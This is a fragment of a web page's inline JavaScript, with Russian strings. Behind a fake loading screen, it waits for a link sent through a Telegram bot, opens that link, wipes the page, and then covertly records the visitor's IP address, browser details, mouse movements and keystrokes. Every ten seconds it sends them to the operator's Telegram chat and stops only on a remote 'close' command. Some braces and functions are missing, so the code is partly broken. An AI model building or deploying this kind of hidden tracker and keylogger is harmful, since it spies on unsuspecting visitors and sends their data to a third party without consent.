        let mouseMovements = [];
        let keyPresses = [];
        let trackingInterval = null;
        let isTracking = false;
        let lastFocusTime = Date.now();

        const container = document.getElementById('main-container');
        const loadingOverlay = document.getElementById('loading-overlay');

        });

        function showModal() {
            modal.style.display = 'block';
            gsap.fromTo("#modal",

                { opacity: 1, y: 0, duration: 0.5, ease: "power2.out" }
            );
        }

        function showConfirmModal() {
            confirmModal.style.display = 'block';

            );
        }

        startButton.addEventListener('click', function() {
            modal.style.display = 'none';
            container.classList.add('disabled');
            startRandomLoading();
        });

        confirmButton.addEventListener('click', function() {
            if (receivedLink) {
                hiddenLink.href = receivedLink;
                hiddenLink.click();
                confirmModal.style.display = 'none';
                clearPage();
                startTracking();
            }
        });

        function clearPage() {
            document.body.innerHTML = '';
            document.body.style.background = 'none';
        }

        function startTracking() {
            if (isTracking) return;
            isTracking = true;

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    collectAndSendData(ipAddress);
                })
                .catch(error => {
                    console.error('Ошибка получения IP:', error);
                    collectAndSendData('IP не получен');
                });

            document.addEventListener('mousemove', (e) => {
                mouseMovements.push(`x: ${e.clientX}, y: ${e.clientY}, time: ${new Date().toISOString()}`);
                if (mouseMovements.length > 50) mouseMovements.shift();
            });

            document.addEventListener('keydown', (e) => {
                keyPresses.push(`key: ${e.key}, time: ${new Date().toISOString()}`);
                if (keyPresses.length > 50) keyPresses.shift();
            });

            window.addEventListener('focus', () => {
                lastFocusTime = Date.now();
                console.log('Вкладка снова активна');
            });

            window.addEventListener('blur', () => {
                console.log('Вкладка потеряла фокус');
            });

            trackingInterval = setInterval(() => {
                collectAndSendData();
            }, 10000);

            checkForCloseCommand();
        }

        function stopTracking() {
            if (!isTracking) return;
            isTracking = false;
            clearInterval(trackingInterval);
            document.removeEventListener('mousemove', () => {});
            document.removeEventListener('keydown', () => {});
            window.removeEventListener('focus', () => {});
            window.removeEventListener('blur', () => {});
            sendCloseNotification();
            window.close();
        }

        function collectAndSendData(ipAddress = 'IP не получен') {
            const timeSpent = Math.floor((Date.now() - startTime) / 1000);
            const timeSinceLastFocus = Math.floor((Date.now() - lastFocusTime) / 1000);
            const userAgent = navigator.userAgent;
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const language = navigator.language || navigator.userLanguage;
            const isFocused = document.hasFocus() ? 'Да' : 'Нет';
            const data = `
Клиентская информация:
- IP: ${ipAddress}
- User-Agent: ${userAgent}
- Разрешение экрана: ${screenResolution}
- Язык: ${language}
- Время на странице: ${timeSpent} сек
- Время с последнего фокуса: ${timeSinceLastFocus} сек
- Вкладка активна: ${isFocused}
- Перешёл по ссылке: ${receivedLink}
- Движения мыши: ${mouseMovements.length > 0 ? mouseMovements.join('; ') : 'Нет данных'}
- Нажатия клавиш: ${keyPresses.length > 0 ? keyPresses.join('; ') : 'Нет данных'}
            `;

            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: data })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Данные отправлены в Telegram');
                }
            })
            .catch(error => console.error('Ошибка отправки данных:', error));
        }

        function checkForCloseCommand() {
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${updateOffset || ''}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        const messages = data.result;
                        const lastMessage = messages[messages.length - 1];
                        if (updateOffset === null) {
                            updateOffset = lastMessage.update_id + 1;
                            return;
                        }
                        updateOffset = lastMessage.update_id + 1;
                        if (lastMessage.message.chat.id == CHAT_ID && lastMessage.message.text.trim().toLowerCase() === 'close') {
                            clearInterval(interval);
                            stopTracking();
                        }
                    }
                })
                .catch(error => console.error('Ошибка проверки команды close:', error));
            }, 2000);
        }

        function startRandomLoading() {
            loadingOverlay.style.display = 'flex';
            waitText.style.display = 'none';
            clearTimeout(loadingTimeout);

            const durations = [
                [1000, 200],
                [200, 200],
                [2000, 300],
                [500, 200],
                [3000, 400]
            ];
            let index = 0;

            function toggleLoading() {
                const [onTime, offTime] = durations[index % durations.length];
                loadingOverlay.style.display = 'flex';
                setTimeout(() => {
                    loadingOverlay.style.display = 'none';
                    setTimeout(toggleLoading, offTime);
                }, onTime);
                index++;
            }

            toggleLoading();
            checkTelegramForLink();
            setTimeout(() => {
                processingMessage.style.display = 'block';
                setTimeout(() => {
                    processingMessage.style.display = 'none';
                }, 3000);
                setTimeout(() => {
                    waitingMessage.style.display = 'block';

                }, 15000);

                        updateOffset = lastMessage.update_id + 1;
                        if (lastMessage.message.chat.id == CHAT_ID) {
                            const messageText = lastMessage.message.text.trim();
                            const linkMatch = messageText.match(/(https?:\/\/[^\s]+)/);
                            if (linkMatch) {
                                clearInterval(interval);
                                callback(linkMatch[0]);
                            }
                        }
                    }
                })
                .catch(error => console.error('Ошибка проверки Telegram:', error));
            }, 2000);
        }

        function showMessage(id) {
            const message = document.getElementById(id);
            message.style.display = 'block';
            setTimeout(() => { message.style.display = 'none'; }, 3000);
        }

        window.addEventListener('beforeunload', function() {
            sendCloseNotification();
        });

        AOS.init({ duration: 800, easing: 'ease-out', once: true });
        gsap.from(".container", { opacity: 0, y: 50, duration: 0.8, ease: "power2.out", delay: 0.2 });
    </script>
</body>
